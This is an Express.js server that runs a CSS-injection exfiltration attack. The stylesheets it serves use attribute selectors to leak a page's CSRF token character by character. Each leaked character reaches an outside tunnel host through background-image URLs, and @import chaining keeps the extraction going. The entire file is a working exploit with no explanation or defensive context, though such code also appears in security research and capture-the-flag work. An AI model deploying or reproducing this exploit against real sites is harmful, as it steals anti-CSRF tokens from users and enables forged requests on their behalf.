const express = require('express')

const app = express()
const port = 3000
const ALPHABET = ["0","1","2","3","4","5","8","6","7","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","!","\"","#","$","&","'","(",")","*","+",","," ", "-",".","/",":",";","<","=",">","?","@","[","\\","]","^","_","`","{","|","}","~",]
const HOSTNAME = 'https://ugly-panther-20.telebit.io'

/**
 * UTILS
 */
function getInputInjection(sequence) {
    return `input[name=csrf][value^=${sequence}] ~ * {background-image:url(${HOSTNAME}/valid?seq=${sequence});}\n`
}

function getCSSelectors(secret) {
    let css = ''
    secret = secret.replace(/([!@#$%^&*()+=\[\]\\';,./{}|":<>?~_-])/g, "\\$1")
    console.log(secret)
    for(i=0; i<ALPHABET.length; i++) {
        if (i>=62) {
            css+=getInputInjection(secret+`\\${ALPHABET[i]}`)
        } else {
            css+=getInputInjection(secret+ALPHABET[i])

        }
    }
    return css
}

function getCSSyncBlock(id) {
    let css = `@import url(${HOSTNAME}/selectors?id=${id});\n`
    css += `@import url(${HOSTNAME}/next?id=${id});\n`
    return css
}

function getCSSWaitingBlock(id) {
    let css = `@import url(${HOSTNAME}/next?id=${id}&rdm=${Math.random()});\n`
    return css
}


/**
 * REQUESTS LOGIC
 */
var secret = ''
var id = 0

app.get('/', (req, res) => {
    res.send('CSS Exfiltration server')
})

app.get('/init.css', (req, res) => {
    console.log('Init process...')
    pending = []
    secret = ''
    id = 0
    res.set({'Content-Type': 'text/css'})
    css = getCSSyncBlock(id)
    res.end(css)
})

app.get('/selectors', (req, res) => {

    const selectorId = req.query.id

    console.log('Selectors id : ' + selectorId)

    res.set({'Content-Type': 'text/css'})
    css = getCSSelectors(secret)
    res.end(css)
})


app.get('/valid', (req, res) => {

    console.log(`Valid sequence n°${id} : ${req.query.seq}`)

    secret = req.query.seq

    id++

    res.set({'Content-Type': 'text/css'})
    css = getCSSelectors(secret)
    res.end(css)
})

app.get('/next', async (req, res) => {

    const nextId = parseInt(req.query.id, 10)

    if (id == nextId+1) {
        console.log(`Next n°${nextId} passed`)
        res.set({'Content-Type': 'text/css'})
        css = getCSSyncBlock(nextId+1)
        res.end(css)
    } else {
        setTimeout(() => {
            console.log('Next not ready yet, waiting...')
            res.set({'Content-Type': 'text/css'})
            css = getCSSWaitingBlock(nextId)
            res.end(css)
        }, 1000)

    }

    //console.log(`Next n°${req.params.id} & subject id : ${id}`)
})

app.listen(port, () => {
    console.log(`CSS exfiltration app listening on port ${port}`)
})